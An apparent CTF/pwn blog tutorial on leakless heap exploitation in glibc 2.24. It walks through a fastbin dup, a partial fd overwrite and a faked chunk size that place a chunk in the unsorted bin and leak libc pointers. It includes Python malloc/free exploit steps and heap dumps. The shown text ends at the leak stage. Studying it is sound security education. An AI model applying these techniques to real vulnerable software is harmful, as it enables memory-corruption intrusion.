---
layout: post
title: Leakless Heap Feng Shui
tags: pwn, ctf, heap, fengshui, glibc
---

# Description:
This blog post will explain how to achieve a leak or full rce in leakless binaries, using Heap FengShui combined with other heap exploitation techniques.

# Assumptions:

*   The exploit will be developped in glibc2.24 _(it can work in tcache as well)_.
*   We will have someway to control size of a chunk , off by one bug or double free can work.
*   We will be using a double free attack _(fastbin dup)_ .
*   The binary has only the option to malloc and free.
*   The binary has full protections.
*   Malloc size limit is 0x80.
*   We can at maximum allocate 15 chunks in total.

# The exploit: 

At first we will try to get a chunk to unsortedbin , this way we will have main_arena pointers , we will use double  free for this.

Let's allocate 3 chunks the 0x41 values will be used later to free a fake chunk.
```python
malloc(0x40-8, 'B'*0x18 + p64(0x41))
malloc(0x70-8, 'C'*0x18 + p64(0x41)*3)
malloc(0x40-8, 'D'*0x28 + p64(0x41))
```

Now the heap layout looks like this:

```python
0x558e29d16000: 0x0000000000000000  0x0000000000000041  <-- chunk 0
0x558e29d16010: 0x4242424242424242  0x4242424242424242
0x558e29d16020: 0x4242424242424242  0x0000000000000041
0x558e29d16030: 0x0000000000000000  0x0000000000000000
0x558e29d16040: 0x0000000000000000  0x0000000000000071  <-- chunk 1
0x558e29d16050: 0x4343434343434343  0x4343434343434343
0x558e29d16060: 0x4343434343434343  0x0000000000000041
0x558e29d16070: 0x0000000000000041  0x0000000000000041  
0x558e29d16080: 0x0000000000000000  0x0000000000000000
0x558e29d16090: 0x0000000000000000  0x0000000000000000
0x558e29d160a0: 0x0000000000000000  0x0000000000000000
0x558e29d160b0: 0x0000000000000000  0x0000000000000041  <-- chunk 2
0x558e29d160c0: 0x4444444444444444  0x4444444444444444
0x558e29d160d0: 0x4444444444444444  0x4444444444444444
0x558e29d160e0: 0x4444444444444444  0x0000000000000041
0x558e29d160f0: 0x0000000000000000  0x0000000000020f11
```

Now we will do a fastbin dup attack on chunk0 and chunk2, we don't have to worry about top consolidation here because fastchunks.

```python
free(0)
free(1)
free(0)
```

Bins state :

```python
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x55cd34151000 --> 0x55cd341510b0 --> 0x55cd34151000 (overlap chunk with 0x55cd34151000(freed) )
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
                  top: 0x55cd341510f0 (size : 0x20f10) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x0
```

Now we will partially overwrite the fd of chunk0 and make it point to 0x558e29d16020 which will be a chunk with size 0x40

```python
malloc(0x40-8, '\x20')
```

Bins state:

```python
(0x40)     fastbin[2]: 0x560e0ada50b0 --> 0x560e0ada5000 --> 0x560e0ada5020 (overlap chunk with 0x560e0ada5000(freed) )
```
Now we will empty our fastbins[2] and continue our fastbin attack and use the chunk 0x560e0ada5020 to modify the size of the chunk 1 to 0xb1

```python
malloc(0x40-8, 'K')
malloc(0x40-8, 'Z')
malloc(0x40-8, 'A'*0x18 + '\xb1')
```

The heap status now :
```
0x56271941b000: 0x0000000000000000  0x0000000000000041  <-- chunk 0,3,5
0x56271941b010: 0x000056271941b05a  0x4242424242424242  
0x56271941b020: 0x4242424242424242  0x0000000000000041  <-- chunk 6
0x56271941b030: 0x4141414141414141  0x4141414141414141
0x56271941b040: 0x4141414141414141  0x00000000000000b1  <-- chunk 1
0x56271941b050: 0x4343434343434343  0x4343434343434343  
0x56271941b060: 0x4343434343434343  0x0000000000000041
0x56271941b070: 0x0000000000000041  0x0000000000000041
0x56271941b080: 0x0000000000000000  0x0000000000000000
0x56271941b090: 0x0000000000000000  0x0000000000000000
0x56271941b0a0: 0x0000000000000000  0x0000000000000000
0x56271941b0b0: 0x0000000000000000  0x0000000000000041  <-- chunk 2,4
0x56271941b0c0: 0x000056271941b04b  0x4444444444444444  
0x56271941b0d0: 0x4444444444444444  0x4444444444444444
0x56271941b0e0: 0x4444444444444444  0x0000000000000041
0x56271941b0f0: 0x0000000000000000  0x0000000000020f11
```

All we need to do now is free chunk 1 it will go directly to unsorted bin, let's go back to our code and add another chunk before topchunk, to avoid consolidation since 0x40+0xb0 = 0xf0

```python
free(1)
```

The heap will look like :
```python
0x556c3f05e000: 0x0000000000000000  0x0000000000000041
0x556c3f05e010: 0x0000556c3f05e05a  0x4242424242424242
0x556c3f05e020: 0x4242424242424242  0x0000000000000041
0x556c3f05e030: 0x4141414141414141  0x4141414141414141
0x556c3f05e040: 0x4141414141414141  0x00000000000000b1
0x556c3f05e050: 0x00007f94fa0e3b78  0x00007f94fa0e3b78
0x556c3f05e060: 0x4343434343434343  0x0000000000000041
0x556c3f05e070: 0x0000000000000041  0x0000000000000041
0x556c3f05e080: 0x0000000000000000  0x0000000000000000
0x556c3f05e090: 0x0000000000000000  0x0000000000000000
0x556c3f05e0a0: 0x0000000000000000  0x0000000000000000
0x556c3f05e0b0: 0x0000000000000000  0x0000000000000041
0x556c3f05e0c0: 0x0000556c3f05e04b  0x4444444444444444
0x556c3f05e0d0: 0x4444444444444444  0x4444444444444444
0x556c3f05e0e0: 0x4444444444444444  0x0000000000000041
0x556c3f05e0f0: 0x00000000000000b0  0x0000000000000070
0x556c3f05e100: 0x0000000000000045  0x0000000000000000
0x556c3f05e110: 0x0000000000000000  0x0000000000000000
0x556c3f05e120: 0x0000000000000000  0x0000000000000000
0x556c3f05e130: 0x0000000000000000  0x0000000000000000
0x556c3f05e140: 0x0000000000000000  0x0000000000000000
0x556c3f05e150: 0x0000000000000000  0x0000000000000000
0x556c3f05e160: 0x0000000000000000  0x0000000000020ea1
```